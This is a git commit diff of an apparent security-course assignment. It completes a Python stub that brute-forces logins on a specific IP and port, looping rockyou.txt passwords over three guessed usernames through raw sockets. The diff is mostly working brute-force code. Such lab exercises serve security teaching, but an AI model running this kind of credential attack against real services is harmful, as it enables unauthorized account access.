6833e8f535a043016393849b21711ed0c53764fc
laurenkosub <laurenkosub@gmail.com>
2018-09-13 14:45:31 -0400

    Week 2 Assignment

--- week/2/stub.py
+++ week/2/stub.py
@@ -26,8 +26,8 @@
 
 import socket
 
-host = "" # IP address here
-port = 0000 # Port here
+host = "142.93.117.193" # IP address here
+port =  1337 # Port here
 wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
 
 def brute_force():
@@ -54,11 +54,30 @@ def brute_force():
             through each possible password and repeatedly attempt to login to
             the Briong server.
     """
+    potential_usernames = ["kruegster", "admin", "Admin"]
 
-    username = ""   # Hint: use OSINT
-    password = ""   # Hint: use wordlist
+    with open(wordlist) as f:
+        for password in f:
+            for i in range(len(potential_usernames)):
+                username = potential_usernames[i]
+               
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((host, port))
+            
+                data = s.recv(10)
 
+                s.send(bytes(username + '\n', 'utf-8'))
+                s.recv(10)
 
+                s.send(bytes(password + '\n', 'utf-8'))
+                data = s.recv(10)
+                print(data)
+
+                if data != b'Fail\n':
+                    user = username
+                    passwd = password
+                    print("USERNAME: " + user + " PASSWORD: " + passwd)
+                    return
 
 
 if __name__ == '__main__':
